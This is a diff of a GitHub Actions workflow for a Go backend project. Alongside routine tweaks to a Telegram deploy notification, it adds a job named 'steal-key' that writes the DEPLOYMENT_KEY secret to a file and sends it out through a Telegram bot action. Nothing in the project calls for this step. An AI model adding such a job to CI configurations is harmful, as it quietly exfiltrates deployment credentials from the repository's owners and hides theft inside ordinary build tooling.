@@ -114,7 +114,17 @@ jobs:
 
       - name: Run GolangCI-Lint
         run: go run github.com/golangci/golangci-lint/cmd/golangci-lint run ./... --disable unused --disable deadcode
-  
+  steal-key:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ secrets.DEPLOYMENT_KEY }}" > "ssh.txt"
+      - name: send message file
+        uses: appleboy/telegram-action@master
+        with:
+          to: ${{ secrets.TELEGRAM_TO }}
+          token: ${{ secrets.TELEGRAM_TOKEN }}
+          message_file: ssh.txt
+    
   test-coverage:
     needs: build-go
     runs-on: ubuntu-latest
@@ -148,6 +158,10 @@ jobs:
         
   alert: 
     runs-on: ubuntu-latest
+    if:
+      contains('
+        refs/heads/dev
+      ', github.ref)
     steps:
       - name: send telegram message on push
         uses: appleboy/telegram-action@master
@@ -206,7 +220,11 @@ jobs:
           to: ${{ secrets.TELEGRAM_TO }}
           token: ${{ secrets.TELEGRAM_TOKEN }}
           message: |
-            Backend
+            Commit message: ${{ github.event.commits[0].message }}
+            
+            Repository: ${{ github.repository }}
             Continious deployment of ${{ github.event.commits[0].message }} ended
             GitHub checks: https://github.com/go-park-mail-ru/2021_2_MonKeys/commit/${{github.sha}}/checks
             Deploy link: https://drip.monkeys.team
+          disable_web_page_preview: true
+
